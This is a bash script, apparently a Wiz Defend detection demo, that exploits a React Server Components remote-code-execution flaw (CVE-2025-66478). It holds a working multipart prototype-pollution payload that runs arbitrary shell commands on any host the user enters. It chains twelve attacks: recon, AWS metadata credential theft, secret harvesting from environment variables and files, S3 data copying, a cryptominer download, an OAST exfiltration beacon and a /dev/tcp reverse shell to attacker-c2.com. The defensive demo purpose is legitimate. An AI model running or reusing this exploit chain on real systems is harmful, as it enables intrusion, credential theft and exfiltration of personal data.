#!/bin/bash
#
# Wiz Demo - Consolidated Attack Script
# CVE-2025-66478 React Server Components RCE
# Demonstrates attack patterns for Wiz Defend detection
#

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Interactive input if no arguments provided
if [ -z "$1" ]; then
    echo -e "${CYAN}Wiz Demo - Target Configuration${NC}"
    echo ""
    read -p "Enter target host [localhost]: " INPUT_TARGET
    TARGET="${INPUT_TARGET:-localhost}"
    read -p "Enter target port [3001]: " INPUT_PORT
    PORT="${INPUT_PORT:-3001}"
    echo ""
else
    TARGET="$1"
    PORT="${2:-3001}"
fi

SLEEP_TIME=2  # Brief pause between attacks for visibility
PAYLOAD_FILE="/tmp/exploit-payload-$$.bin"
TOTAL_ATTACKS=12

# Banner
echo -e "${RED}"
cat << 'EOF'
 __        ___       ____
 \ \      / (_)____ |  _ \  ___ _ __ ___   ___
  \ \ /\ / /| |_  / | | | |/ _ \ '_ ` _ \ / _ \
   \ V  V / | |/ /  | |_| |  __/ | | | | | (_) |
    \_/\_/  |_/___| |____/ \___|_| |_| |_|\___/

EOF
echo -e "${NC}"
echo -e "${WHITE}CVE-2025-66478 - React Server Components RCE${NC}"
echo -e "${YELLOW}Consolidated Attack Script for Wiz Defend${NC}"
echo ""
echo -e "${CYAN}Target:${NC} http://${TARGET}:${PORT}"
echo -e "${CYAN}Attacks:${NC} ${TOTAL_ATTACKS} attack patterns"
echo ""
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
echo ""

# Proven payload delivery function
send_payload() {
    local cmd="$1"

    python3 -c "
import sys
payload = '''------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name=\"0\"\r
\r
{\"then\":\"\$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\\\"then\\\\\":\\\\\"\$B1337\\\\\"}\",\"_response\":{\"_prefix\":\"process.mainModule.require('child_process').execSync('$cmd');\",\"_chunks\":\"\$Q2\",\"_formData\":{\"get\":\"\$1:constructor:constructor\"}}}\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name=\"1\"\r
\r
\"\$@0\"\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name=\"2\"\r
\r
[]\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r
'''
sys.stdout.buffer.write(payload.replace('\\\\r\\\\n', '\r\n').encode())
" > "$PAYLOAD_FILE"

    # Exploit executes on server immediately, but server hangs without response
    # Need 5s to ensure upload completes over network
    curl -s -X POST "http://${TARGET}:${PORT}" \
        -H "Next-Action: x" \
        -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
        --data-binary @"$PAYLOAD_FILE" \
        --connect-timeout 3 -m 5 > /dev/null 2>&1 || true
    rm -f "$PAYLOAD_FILE" 2>/dev/null || true
}

# Attack display function
run_attack() {
    local num="$1"
    local icon="$2"
    local name="$3"
    local desc="$4"
    local alert="$5"
    local cmd="$6"

    echo -e "${YELLOW}[${num}/${TOTAL_ATTACKS}]${NC} ${icon} ${WHITE}${name}${NC}"
    echo -e "    ${BLUE}Description:${NC} ${desc}"
    echo -e "    ${GREEN}Wiz Alert:${NC} ${alert}"
    echo ""

    send_payload "$cmd"

    echo -e "    ${GREEN}✓${NC} Attack executed"
    echo ""
    echo -e "${BLUE}───────────────────────────────────────────────────────────────${NC}"
    echo ""
    sleep $SLEEP_TIME
}

# ═══════════════════════════════════════════════════════════════
# PHASE 1: Initial Access & RCE Proof
# ═══════════════════════════════════════════════════════════════

echo -e "${PURPLE}▶ PHASE 1: Initial Access & RCE Proof${NC}"
echo ""

run_attack "1" "💥" "Remote Code Execution - UI Takeover" \
    "Exploits CVE-2025-66478 to write marker file, triggers PWNED banner" \
    "Malicious Process Execution" \
    'echo eyJtZXNzYWdlIjoiUFdORUQifQ== | base64 -d > /tmp/banner.json'

run_attack "2" "🔍" "System Reconnaissance" \
    "Gathers system information via command execution" \
    "Suspicious Command Execution" \
    'whoami > /tmp/rce-whoami.txt && id >> /tmp/rce-whoami.txt && uname -a > /tmp/rce-uname.txt'

# ═══════════════════════════════════════════════════════════════
# PHASE 2: Credential Theft
# ═══════════════════════════════════════════════════════════════

echo -e "${PURPLE}▶ PHASE 2: Credential Theft${NC}"
echo ""

run_attack "3" "☁️" "Cloud Metadata Service Access" \
    "Queries AWS IMDS to discover IAM role attached to instance" \
    "Cloud Metadata Service Access" \
    'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ > /tmp/imds-role.txt'

run_attack "4" "🔑" "IAM Credential Theft" \
    "Extracts temporary AWS credentials from IMDS" \
    "Cloud Credential Theft" \
    'ROLE=$(cat /tmp/imds-role.txt); curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE > /tmp/imds-creds.json'

run_attack "5" "🌍" "Environment Variable Harvesting" \
    "Scans environment for AWS keys, secrets, tokens, and passwords" \
    "Credential Harvesting" \
    'env | grep -iE "AWS|KEY|SECRET|TOKEN|PASS|API" > /tmp/env-secrets.txt 2>/dev/null || echo "ENV_SCAN_COMPLETE" > /tmp/env-secrets.txt'

# ═══════════════════════════════════════════════════════════════
# PHASE 3: Discovery & Lateral Movement
# ═══════════════════════════════════════════════════════════════

echo -e "${PURPLE}▶ PHASE 3: Discovery & Lateral Movement${NC}"
echo ""

run_attack "6" "📁" "Filesystem Secret Scanning" \
    "Searches for .env files, SSH keys, config files, and credentials" \
    "Sensitive File Access" \
    'find /root /home /etc /opt -type f -name "*.env" -o -name "*.pem" -o -name "*.key" -o -name "config.json" -o -name "credentials" 2>/dev/null | head -20 > /tmp/secret-files.txt || echo "SCAN_COMPLETE" > /tmp/secret-files.txt'

run_attack "7" "🪣" "S3 Bucket Discovery" \
    "Uses stolen IAM credentials to list accessible S3 buckets" \
    "Cloud API Enumeration" \
    'aws s3 ls > /tmp/s3-buckets.txt 2>&1'

run_attack "8" "📂" "S3 Sensitive Data Access" \
    "Accesses S3 bucket containing sensitive data" \
    "Cloud Data Access" \
    'aws s3 ls s3://wiz-demo-sensitive-data-wiz-e624d66e/ --recursive > /tmp/s3-sensitive.txt 2>&1'

# ═══════════════════════════════════════════════════════════════
# PHASE 4: Data Exfiltration & Persistence
# ═══════════════════════════════════════════════════════════════

echo -e "${PURPLE}▶ PHASE 4: Data Exfiltration & Persistence${NC}"
echo ""

run_attack "9" "📤" "Data Exfiltration" \
    "Downloads PII, medical records, and API keys from S3" \
    "Data Exfiltration" \
    'aws s3 cp s3://wiz-demo-sensitive-data-wiz-e624d66e/employees.json /tmp/exfil-employees.json 2>&1 && aws s3 cp s3://wiz-demo-sensitive-data-wiz-e624d66e/healthcare/patient_records.json /tmp/exfil-medical.json 2>&1'

run_attack "10" "⛏️" "Cryptominer Download Attempt" \
    "Attempts to download cryptocurrency miner from GitHub" \
    "Cryptominer Activity" \
    'curl -s -o /tmp/xmrig https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz --connect-timeout 3 2>/dev/null || echo "MINER_DOWNLOAD_ATTEMPT" > /tmp/miner-marker.txt'

run_attack "11" "📡" "OAST Exfiltration Beacon" \
    "Exfiltrates data via HTTP callback to attacker-controlled OAST domain" \
    "Data Exfiltration / C2 Callback" \
    'curl -s http://script-oast-test.aezukuqsjqlaoghyjmiw9mg769uqgs4gb.oast.fun/exfil --connect-timeout 3'

# ═══════════════════════════════════════════════════════════════
# PHASE 5: Reverse Shell
# ═══════════════════════════════════════════════════════════════

echo -e "${PURPLE}▶ PHASE 5: Reverse Shell${NC}"
echo ""

run_attack "12" "🚨" "Reverse Shell Attempt" \
    "Attempts to establish interactive shell to attacker C2 server" \
    "Reverse Shell / C2 Communication" \
    'bash -c "/bin/bash -i > /dev/tcp/attacker-c2.com/4444 0<&1 2>&1" 2>/dev/null || echo "REVERSE_SHELL_ATTEMPTED" > /tmp/revshell-marker.txt'

# ═══════════════════════════════════════════════════════════════
# Summary
# ═══════════════════════════════════════════════════════════════

echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${RED}    ╔═══════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}    ║           ALL ${TOTAL_ATTACKS} ATTACKS EXECUTED                   ║${NC}"
echo -e "${RED}    ╚═══════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${WHITE}Expected Wiz Defend Alerts:${NC}"
echo ""
echo -e "    ${GREEN}Phase 1:${NC} Initial Access"
echo -e "      • 💥 Malicious Process Execution"
echo -e "      • 🔍 Suspicious Command Execution"
echo ""
echo -e "    ${GREEN}Phase 2:${NC} Credential Theft"
echo -e "      • ☁️  Cloud Metadata Service Access"
echo -e "      • 🔑 Cloud Credential Theft"
echo -e "      • 🌍 Credential Harvesting"
echo ""
echo -e "    ${GREEN}Phase 3:${NC} Discovery & Lateral Movement"
echo -e "      • 📁 Sensitive File Access"
echo -e "      • 🪣 Cloud API Enumeration"
echo -e "      • 📂 Cloud Data Access"
echo ""
echo -e "    ${GREEN}Phase 4:${NC} Exfiltration & Persistence"
echo -e "      • 📤 Data Exfiltration"
echo -e "      • ⛏️  Cryptominer Activity"
echo -e "      • 📡 DNS Exfiltration"
echo ""
echo -e "    ${GREEN}Phase 5:${NC} Reverse Shell"
echo -e "      • 🚨 Reverse Shell / C2 Communication"
echo ""
echo -e "${CYAN}Artifacts created on target:${NC}"
echo -e "    /tmp/banner.json        - RCE proof (triggers PWNED UI)"
echo -e "    /tmp/imds-creds.json    - Stolen AWS credentials"
echo -e "    /tmp/s3-sensitive.txt   - S3 bucket listing"
echo -e "    /tmp/exfil-*.json       - Exfiltrated data"
echo -e "    /tmp/revshell-marker.txt - Reverse shell marker"
echo ""
echo -e "${YELLOW}📊 Open Wiz Defend console to view the attack timeline${NC}"
echo ""
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
